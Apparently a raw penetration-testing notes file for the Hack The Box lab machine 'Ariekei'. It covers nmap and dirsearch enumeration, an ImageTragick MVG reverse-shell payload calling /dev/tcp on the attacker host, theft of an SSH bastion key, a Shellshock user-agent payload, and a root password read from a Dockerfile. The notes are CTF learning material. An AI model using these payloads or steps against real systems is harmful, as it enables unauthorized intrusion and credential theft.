@@ -1,0 +1,495 @@
+Machine-Name   :   Ariekei
+IP-Address     :   10.129.65.143
+
+
+Command-Line: sudo nmap -A 10.129.65.143
+Result:
+    Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-12 00:38 EST
+    Nmap scan report for 10.129.65.143
+    Host is up (0.058s latency).
+    Not shown: 997 closed ports
+    PORT     STATE SERVICE   VERSION
+    22/tcp   open  ssh       OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   2048 a7:5b:ae:65:93:ce:fb:dd:f9:6a:7f:de:50:67:f6:ec (RSA)
+    |   256 64:2c:a6:5e:96:ca:fb:10:05:82:36:ba:f0:c9:92:ef (ECDSA)
+    |_  256 51:9f:87:64:be:99:35:2a:80:a6:a2:25:eb:e0:95:9f (ED25519)
+    443/tcp  open  ssl/https nginx/1.10.2
+    |_http-server-header: nginx/1.10.2
+    |_http-title: 400 The plain HTTP request was sent to HTTPS port
+    | ssl-cert: Subject: stateOrProvinceName=Texas/countryName=US
+    | Subject Alternative Name: DNS:calvin.ariekei.htb, DNS:beehive.ariekei.htb
+    | Not valid before: 2017-09-24T01:37:05
+    |_Not valid after:  2045-02-08T01:37:05
+    |_ssl-date: TLS randomness does not represent time
+    | tls-alpn:
+    |_  http/1.1
+    | tls-nextprotoneg:
+    |_  http/1.1
+    1022/tcp open  ssh       OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+    | ssh-hostkey:
+    |   1024 98:33:f6:b6:4c:18:f5:80:66:85:47:0c:f6:b7:90:7e (DSA)
+    |   2048 78:40:0d:1c:79:a1:45:d4:28:75:35:36:ed:42:4f:2d (RSA)
+    |   256 45:a6:71:96:df:62:b5:54:66:6b:91:7b:74:6a:db:b7 (ECDSA)
+    |_  256 ad:8d:4d:69:8e:7a:fd:d8:cd:6e:c1:4f:6f:81:b4:1f (ED25519)
+    No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+    TCP/IP fingerprint:
+    OS:SCAN(V=7.91%E=4%D=12/12%OT=22%CT=1%CU=30770%PV=Y%DS=2%DC=T%G=Y%TM=5FD457
+    OS:57%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10F%TI=Z%CI=I%II=I%TS=8)OP
+    OS:S(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST
+    OS:11NW7%O6=M54DST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)EC
+    OS:N(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
+    OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
+    OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
+    OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
+    OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
+    OS:D=S)
+
+    Network Distance: 2 hops
+    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+    TRACEROUTE (using port 3306/tcp)
+    HOP RTT      ADDRESS
+    1   63.34 ms 10.10.14.1
+    2   63.68 ms 10.129.65.143
+
+    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+    Nmap done: 1 IP address (1 host up) scanned in 23.71 seconds
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt -f -t 20 -e php,txt -i 200 -u https://10.129.65.143
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.0
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, txt | HTTP method: GET | Threads: 20 | Wordlist size: 171968
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-20-12-12_00-50-59.log
+
+    Target: https://10.129.65.143/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/10.129.65.143/_20-12-12_00-50-59.txt
+
+    [00:50:59] Starting:
+    [00:51:02] 200 -    6KB - /blog/
+    [00:51:07] 200 -  487B  - /.
+    [00:51:07] 200 -  487B  - /./
+
+    Task Completed
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -f -t 20 -i 200,403,301 --suffixes / -u https://ariekei.htb
+Result:
+      _|. _ _  _  _  _ _|_    v0.4.0
+     (_||| _) (/_(_|| (_| )
+
+    Extensions: php, asp, aspx, jsp, html, htm, js | HTTP method: GET | Suffixes: / | Threads: 20 | Wordlist size: 1133344
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-20-12-12_14-51-04.log
+
+    Target: https://ariekei.htb/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/ariekei.htb/_20-12-12_14-51-05.txt
+
+    [14:51:05] Starting:
+    [14:51:07] 403 -  287B  - /cgi-bin/
+    [14:52:18] 200 -    6KB - /blog/
+    [14:54:05] 403 -  285B  - /icons/
+
+
+Notes: Performing dirsearch on: /cgi-bin/
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt -f -t 50 -i 200,403 -u https://ariekei.htb/cgi-bin/
+Result:
+    _|. _ _  _  _  _ _|_    v0.4.0
+    (_||| _) (/_(_|| (_| )
+
+    Extensions: php, asp, aspx, jsp, html, htm, js | HTTP method: GET | Threads: 50 | Wordlist size: 1275012
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-20-12-12_14-55-13.log
+
+    Target: https://ariekei.htb/cgi-bin/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/ariekei.htb/.cgi-bin_20-12-12_14-55-14.txt
+
+    [14:55:14] Starting:
+    [15:01:56] 200 -    1KB - /cgi-bin/stats
+    [15:01:58] 200 -    1KB - /cgi-bin/stats/
+
+
+Browser: https://ariekei.htb/cgi-bins/stats/
+Result:
+    Sat Dec 12 20:11:40 UTC 2020
+    20:11:40 up 14:36, 0 users, load average: 0.40, 0.43, 0.39
+    GNU bash, version 4.2.37(1)-release (x86_64-pc-linux-gnu) Copyright (C) 2011 Free Software Foundation, Inc. License GPLv3+: GNU GPL version 3 or later  This is free software; you are free to change and redistribute it. There is NO WARRANTY, to the extent permitted by law.
+    Environment Variables:
+
+    SERVER_SIGNATURE=
+    Apache/2.2.22 (Debian) Server at ariekei.htb Port 80
+
+
+    HTTP_USER_AGENT=Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
+    HTTP_X_FORWARDED_FOR=10.10.14.147
+    SERVER_PORT=80
+    HTTP_HOST=ariekei.htb
+    HTTP_X_REAL_IP=10.10.14.147
+    DOCUMENT_ROOT=/home/spanishdancer/content
+    SCRIPT_FILENAME=/usr/lib/cgi-bin/stats
+    REQUEST_URI=/cgi-bin/stats/
+    SCRIPT_NAME=/cgi-bin/stats
+    HTTP_CONNECTION=close
+    PATH_INFO=/
+    REMOTE_PORT=55178
+    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+    PWD=/usr/lib/cgi-bin
+    SERVER_ADMIN=webmaster@localhost
+    HTTP_ACCEPT_LANGUAGE=en-US,en;q=0.5
+    PATH_TRANSLATED=/home/spanishdancer/content/index.html
+    HTTP_DNT=1
+    HTTP_ACCEPT=text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+    REMOTE_ADDR=172.24.0.1
+    SHLVL=1
+    SERVER_NAME=ariekei.htb
+    SERVER_SOFTWARE=Apache/2.2.22 (Debian)
+    QUERY_STRING=
+    SERVER_ADDR=172.24.0.2
+    GATEWAY_INTERFACE=CGI/1.1
+    HTTP_UPGRADE_INSECURE_REQUESTS=1
+    SERVER_PROTOCOL=HTTP/1.0
+    HTTP_ACCEPT_ENCODING=gzip, deflate
+    REQUEST_METHOD=GET
+    _=/usr/bin/env
+
+Notes: Bash version vulnerable to "ShellShock".
+
+Burpsuite: Turned on Intercept. Intercepted /cgi-bin/status/. Sent to Repeater.
+Result: ShellShock UNSUCCESSFUL.
+
+
+SSL-Certificate-Notes: Found DNS domains "beehive.ariekei.htb" and "calvin.ariekei.htb"
+
+Notes: Cam also run `sslyze` command. "sslyze --regular 10.129.65.143"
+
+
+Command-Line: ./dirsearch.py -w /usr/share/wordlists/my_wordlist.txt -f -t 20 -i 200,301,403 -u https://calvin.ariekei.htb
+Result:
+    _|. _ _  _  _  _ _|_    v0.4.0
+    (_||| _) (/_(_|| (_| )
+
+    Extensions: php, asp, aspx, jsp, html, htm, js | HTTP method: GET | Threads: 20 | Wordlist size: 189
+
+    Error Log: /home/kali/HackingTools/dirsearch/logs/errors-20-12-12_18-37-47.log
+
+    Target: https://calvin.ariekei.htb/
+
+    Output File: /home/kali/HackingTools/dirsearch/reports/calvin.ariekei.htb/_20-12-12_18-37-47.txt
+
+    [18:37:47] Starting:
+    [18:37:49] 200 -    2KB - /upload
+
+    Task Completed
+
+
+Browser: https://calvin.ariekei.htb/upload
+Result:
+    <!doctype html>
+        <title>Image Converter</title>
+        <h1>Upload Image</h1>
+        <p> This app is under development and may not work as expected  </p>
+        <form action="" method=post enctype=multipart/form-data>
+            <p><input type=file name=file>
+            <input type=submit value=Upload></p>
+        </form>
+        <!--
+
+                                    g@@
+                A.                 d@V@
+                i@b               iA` @                    .A
+                i@V@s            dA`  @                   ,@@i
+                i@ '*@Ws______mW@f    @@                  ]@@@
+                 @]  '^********f`     @@@                g@!l@
+                 @b           .  ,g   @@@W             ,W@[ l@
+                 ]@   Mmmmmf  ~**f^   @@^@@Wm_.      _g@@`  l@
+                  M[    ^^      ^^    @@  ^*@@@@@@@@@@@f`   l@
+                  ]@i  '[]`  . '[]`   @@      ~~~~~~~`      l@
+                  '@W       |[        @@               _.   l@
+                   Y@i      'Ns    .  @@   _m@@m,    g*~VWi l@
+                    M@. ,.       g@` ]@@  gP    V,  '  m- ` l@
+                    '@W  Vmmmmmm@f   @@@. ~  m-    g   '    l@
+                     '@b  'V***f    g@A@W    '     @        l@
+                      '*W_         g@A`M@b       g M_.      l@
+                        'VMms___gW@@f   @@.      '- ~`      W@
+                           ~*****f~`     @@.     ,_m@Ws__   @@
+                                         '@@.   gA~`   ~~* ]@P
+                                           M@s.'`         g@A
+                                            V@@Ws.    __m@@A
+                                              ~*M@@@@@@@@*`   (ASCII Art credit to David Laundra)
+        -->
+
+
+Broswer-Search: ImageTragick
+URL: https://imagetragick.com/
+Found-Exploit: exploit.mvg
+    push graphic-context
+    viewbox 0 0 640 480
+    fill 'url(https://example.com/image.jpg";|ls "-la)'
+    pop graphic-context
+
+Notes: Looking for a different "fill" with the same Browser-Search.
+URL: https://blog.cloudflare.com/inside-imagetragick-the-real-payloads-being-used-to-hack-websites-2/
+Found-Exploit: fill 'url(https://"22|setsid /bin/bash -i >& /dev/tcp/xx.xx.248.51/443
+0<&1 2>&1")'
+
+Command-Line: sudo nc -lvnp 443
+Result:
+    listening on [any] 443 ...
+
+Command-Line: nano image.mvg
+File-Contents: image.mvg
+    push graphic-context
+    viewbox 0 0 640 480
+    ill 'url(https://"22|setsid /bin/bash -i >& /dev/tcp/10.10.14.147/443
+    pop graphic-context
+
+Browser: https://calvin.ariekei.htb/upload
+Notes: Turned on Burpsuite Intercept. Clicked on "Browse" button in "/upload". Selected /image.mvg. Clicked "Upload".
+Result: [root@calvin app]#
+    *** REVERSE SHELL ***
+
+[root@calvin]# whoami
+Result: root
+
+[root@calvin]# cd /proc/net
+[root@calvin]# cat fib_trie
+Result:
+    Main:
+      +-- 0.0.0.0/0 3 0 5
+         |-- 0.0.0.0
+            /0 universe UNICAST
+         +-- 127.0.0.0/8 2 0 2
+            +-- 127.0.0.0/31 1 0 0
+               |-- 127.0.0.0
+                  /32 link BROADCAST
+                  /8 host LOCAL
+               |-- 127.0.0.1
+                  /32 host LOCAL
+            |-- 127.255.255.255
+               /32 link BROADCAST
+         +-- 172.23.0.0/24 2 0 2
+            +-- 172.23.0.0/28 2 0 2
+               |-- 172.23.0.0
+                  /32 link BROADCAST
+                  /24 link UNICAST
+               |-- 172.23.0.11
+                  /32 host LOCAL
+            |-- 172.23.0.255
+               /32 link BROADCAST
+    Local:
+      +-- 0.0.0.0/0 3 0 5
+         |-- 0.0.0.0
+            /0 universe UNICAST
+         +-- 127.0.0.0/8 2 0 2
+            +-- 127.0.0.0/31 1 0 0
+               |-- 127.0.0.0
+                  /32 link BROADCAST
+                  /8 host LOCAL
+               |-- 127.0.0.1
+                  /32 host LOCAL
+            |-- 127.255.255.255
+               /32 link BROADCAST
+         +-- 172.23.0.0/24 2 0 2
+            +-- 172.23.0.0/28 2 0 2
+               |-- 172.23.0.0
+                  /32 link BROADCAST
+                  /24 link UNICAST
+               |-- 172.23.0.11
+                  /32 host LOCAL
+            |-- 172.23.0.255
+               /32 link BROADCAST
+
+
+[root@calvin net]# cat arp
+Result:
+    IP address       HW type     Flags       HW address            Mask     Device
+    172.23.0.252     0x1         0x2         02:42:ac:17:00:fc     *        eth0
+    172.23.0.1       0x1         0x2         02:42:18:a7:45:63     *        eth0
+
+Notes: Had to use /proc because arp binary was not found.
+
+Gateway: 172.23.0.11
+Web-Application-Firewall: 172.23.0.252
+
+
+[root@calvin net]# cd /
+[root@calvin /]# ls -la
+Result:
+    total 20
+    drwxr-xr-x  5 root root 4096 Sep 23  2017 .
+    drwxr-xr-x 36 root root 4096 Nov 13  2017 ..
+    drwxrwxr-x  2 root root 4096 Sep 24  2017 .secrets
+    drwxr-xr-x  6 root root 4096 Sep 23  2017 containers
+    drwxr-xr-x  2 root root 4096 Sep 24  2017 network
+
+
+[root@calvin /]# cd .secrets
+[root@calvin .secrets]# ls -la
+Result:
+    total 16
+    drwxrwxr-x 2 root root 4096 Sep 24  2017 .
+    drwxr-xr-x 5 root root 4096 Sep 23  2017 ..
+    -r--r----- 1 root root 1679 Sep 23  2017 bastion_key
+    -r--r----- 1 root root  393 Sep 23  2017 bastion_key.pub
+
+Notes: Copied "bastion_key" and "bastion_key.pub" to /Ariekei_NF folder.
+
+Command-Line: chmod 600 bastion_key
+
+[root@calvin .secrets] cd ../
+[root@calvin common]# cd network
+[root@calvin network]# ls -la
+Result:
+    drwxr-xr-x 2 root root  4096 Sep 24  2017 .
+    drwxr-xr-x 5 root root  4096 Sep 23  2017 ..
+    -rw-r--r-- 1 root root 39774 Sep 24  2017 info.png
+    -rwxr-xr-x 1 root root   437 Sep 23  2017 make_nets.sh
+
+
+Command-Line: ssh -i bastion_key -p 1022 root@10.129.65.143
+Result:
+    Last login: Mon Nov 13 15:20:19 2017 from 10.10.14.2
+    root@ezra:~#
+
+root@ezra:~# cd ../
+root@ezra:/# ls -la
+Result:
+    total 76
+    drwxr-xr-x  52 root root 4096 Nov 13  2017 .
+    drwxr-xr-x  52 root root 4096 Nov 13  2017 ..
+    -rwxr-xr-x   1 root root    0 Nov 13  2017 .dockerenv
+    drwxr-xr-x   2 root root 4096 Aug 17  2017 bin
+    drwxr-xr-x   2 root root 4096 Apr 10  2014 boot
+    drwxr-xr-x   5 root root 4096 Sep 23  2017 common
+    drwxr-xr-x   5 root root  360 Dec 13 06:25 dev
+    drwxr-xr-x  79 root root 4096 Nov 13  2017 etc
+    drwxr-xr-x   2 root root 4096 Apr 10  2014 home
+    drwxr-xr-x  14 root root 4096 Sep 21  2017 lib
+    drwxr-xr-x   2 root root 4096 Aug 17  2017 lib64
+    drwxr-xr-x   2 root root 4096 Aug 17  2017 media
+    drwxr-xr-x   2 root root 4096 Apr 10  2014 mnt
+    drwxr-xr-x   2 root root 4096 Aug 17  2017 opt
+    dr-xr-xr-x 188 root root    0 Dec 13 06:25 proc
+    drwx------   4 root root 4096 Nov 13  2017 root
+    drwxr-xr-x   9 root root 4096 May 28  2020 run
+    drwxr-xr-x   2 root root 4096 Sep 13  2017 sbin
+    drwxr-xr-x   2 root root 4096 Aug 17  2017 srv
+    dr-xr-xr-x  13 root root    0 Dec 14 01:13 sys
+    drwxrwxrwt   2 root root 4096 Sep 21  2017 tmp
+    drwxr-xr-x  16 root root 4096 Sep 21  2017 usr
+    drwxr-xr-x  19 root root 4096 Nov 13  2017 var
+
+
+root@ezra:/# ifconfig
+Result:
+    eth0      Link encap:Ethernet  HWaddr 02:42:ac:17:00:fd
+              inet addr:172.23.0.253  Bcast:0.0.0.0  Mask:255.255.255.0
+              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+              RX packets:519 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:294 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:0
+              RX bytes:53404 (53.4 KB)  TX bytes:41047 (41.0 KB)
+
+    eth1      Link encap:Ethernet  HWaddr 02:42:ac:18:00:fd
+              inet addr:172.24.0.253  Bcast:0.0.0.0  Mask:255.255.255.0
+              UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
+              RX packets:49 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:0 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:0
+              RX bytes:3622 (3.6 KB)  TX bytes:0 (0.0 B)
+
+    lo        Link encap:Local Loopback
+              inet addr:127.0.0.1  Mask:255.0.0.0
+              UP LOOPBACK RUNNING  MTU:65536  Metric:1
+              RX packets:10 errors:0 dropped:0 overruns:0 frame:0
+              TX packets:10 errors:0 dropped:0 overruns:0 carrier:0
+              collisions:0 txqueuelen:1
+              RX bytes:710 (710.0 B)  TX bytes:710 (710.0 B)
+
+
+root@ezra:/common/containers# ls -la
+Result:
+    total 24
+    drwxr-xr-x 6 root root 4096 Sep 23  2017 .
+    drwxr-xr-x 5 root root 4096 Sep 23  2017 ..
+    drwxr-xr-x 2 root  999 4096 Nov 13  2017 bastion-live
+    drwxr-xr-x 5 root  999 4096 Nov 13  2017 blog-test
+    drwxr-xr-x 3 root root 4096 Nov 13  2017 convert-live
+    drwxr-xr-x 5 root root 4096 Nov 13  2017 waf-live
+
+root@ezra:/common/containers# cd blog-test
+
+root@ezra:/common/containers/blog-test# cat start.sh
+Result:
+    docker run \
+    -v /dev/null:/root/.sh_history \
+    -v /dev/null:/root/.bash_history \
+    --restart on-failure:5 \
+    --net arieka-test-net --ip 172.24.0.2 \
+    -h beehive.ariekei.htb --name blog-test -dit \
+    -v /opt/docker:/common:ro \
+    -v $(pwd)/cgi:/usr/lib/cgi-bin:ro \
+    -v $(pwd)/config:/etc/apache2:ro \
+    -v $(pwd)/logs:/var/log/apache2 \
+    -v /home/spanishdancer:/home/spanishdancer:ro  web-template
+
+
+root@ezra:/common/containers/blog-test# cd /
+Notes: Performing shell-shock.
+root@ezra:/# wget --user-agent='() {  :;}; echo; echo; /usr/bin/whoami' 172.24.0.2/cgi-bin/stats
+--2020-12-20 01:01:26--  http://172.24.0.2/cgi-bin/stats
+Connecting to 172.24.0.2:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: unspecified
+Saving to: 'stats'
+
+    [ <=>                                                                                                                                                                                             ] 10          --.-K/s   in 0.002s
+
+2020-12-20 01:01:26 (6.28 KB/s) - 'stats' saved [10]
+
+
+
+root@ezra:/# cat stats
+Result:
+    www-data
+
+Notes: Held down SHIFT + squiggly-key + 'C'.
+Result: SSH SHELL.
+    ssh>
+
+ssh> help
+Result:
+      -L[bind_address:]port:host:hostport    Request local forward
+      -R[bind_address:]port:host:hostport    Request remote forward
+      -D[bind_address:]port                  Request dynamic forward
+      -KL[bind_address:]port                 Cancel local forward
+      -KR[bind_address:]port                 Cancel remote forward
+      -KD[bind_address:]port                 Cancel dynamic forward
+
+
+
+root@ezra:/# cd /common/containers/bastion-live
+root@ezra:/common/containers/bastion-live# ls
+Result:
+    Dockerfile  build.sh  sshd_config  start.sh
+
+root@ezra:/common/containers/bastion-live# cat Dockerfile
+Result:
+    FROM rastasheep/ubuntu-sshd
+    RUN echo "root:Ib3!kTEvYw6*P7s" | chpasswd
+    RUN mkdir -p /root/.ssh
+    RUN echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDwzZ8tXRyG6en6U8d4r/oL/fpx2Aw+V22u8dJjNnSP9jly+RFJk8Z+aKMFTIYJ+orjyMxieqMtyYdVOUDvCanMnChmPbIWqw6UzdV+nnBrWTE/4keDSRn8ijs10tPPiBDDDpqQf21XiiyUfD0RkAl3gJk6hw7wHfWEilR1KWflbNAlau+lfM9YOFLbYrFmpKnZivqkDtuEPfnIVDurS2CiDC+oS+fnP2nGcIMec95iiPpJ4MhPvbdlb+UCxV6FoNtehT9ciZukD0xIXakwAwGlPlFQbzQqqEjEh5ltvnaJG6QzPfLnB6Uis8ku0NNDitreBm2Ba9sJ8NpXh46Ighhh root@arieka" > /root/.ssh/authorized_keys
+    RUN mkdir /common
+
+
+Command-Line: ssh root@172.24.0.2
+Password: Ib3!kTEvYw6*P7s
+Result: ***  ***
